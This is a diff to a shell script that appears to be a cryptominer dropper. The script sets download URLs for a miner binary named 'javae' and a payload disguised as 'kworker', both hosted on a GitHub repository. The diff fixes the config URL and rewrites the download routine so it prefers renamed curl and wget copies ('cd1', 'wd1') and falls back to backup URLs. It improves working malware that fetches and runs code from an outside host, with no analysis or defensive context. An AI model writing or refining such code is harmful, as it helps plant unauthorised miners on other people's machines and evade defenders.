@@ -45,7 +45,7 @@ sh_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworker"
 miner_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
 miner_size="8350992"
 sh_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/kworker" 
-config_url="https://github.com/Tszialim/LaunchJava/blob/main/config.json"
+config_url="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/config.json"
 miner_url_backup="https://github.com/Tszialim/LaunchJava/raw/refs/heads/main/javae"
 chattr_size="8000" 
 
@@ -384,27 +384,42 @@ downloads() {
     local dest="$2"
     local backup_url="$3"
 
-    if [ -x "/usr/bin/curl" ] || [ -x "/usr/bin/cd1" ]; then
-        local cmd="curl"
-        [ -x "/usr/bin/cd1" ] && [ ! -x "/usr/bin/curl" ] && cmd="cd1"
-        
-        $cmd --connect-timeout 30 --retry 3 -sL "$url" -o "$dest"
-        
-        if [ ! -s "$dest" ] && [ -n "$backup_url" ]; then
-            $cmd --connect-timeout 30 --retry 3 -sL "$backup_url" -o "$dest"
+    local cmd=""
+    if command -v cd1 >/dev/null 2>&1; then cmd="cd1"
+    elif command -v curl >/dev/null 2>&1; then cmd="curl"
+    elif command -v wd1 >/dev/null 2>&1; then cmd="wd1"
+    elif command -v wget >/dev/null 2>&1; then cmd="wget"
+    else
+        echo "Error: Neither curl nor wget is available." >&2
+        return 1
+    fi
+
+    _do_download() {
+        local target_url="$1"
+        rm -f "$dest" 
+
+        if [ "$cmd" = "curl" ] || [ "$cmd" = "cd1" ]; then
+            $cmd --connect-timeout 30 --retry 3 -sSL "$target_url" -o "$dest"
+        else
+
+            $cmd --timeout=30 --tries=3 -q -O "$dest" "$target_url"
         fi
 
+        [ -s "$dest" ]
+    }
 
-    elif [ -x "/usr/bin/wget" ] || [ -x "/usr/bin/wd1" ]; then
-        local cmd="wget"
-        [ -x "/usr/bin/wd1" ] && [ ! -x "/usr/bin/wget" ] && cmd="wd1"
+    if _do_download "$url"; then
+        return 0
+    fi
 
-        $cmd --timeout=30 --tries=3 -O "$dest" "$url"
-        
-        if [ $? -ne 0 ] && [ -n "$backup_url" ]; then
-            $cmd --timeout=30 --tries=3 -O "$dest" "$backup_url"
+    if [ -n "$backup_url" ]; then
+        echo "Primary URL failed, trying backup URL..." >&2
+        if _do_download "$backup_url"; then
+            return 0
         fi
     fi
+
+    return 1
 }
 
 generate_machine_id() {
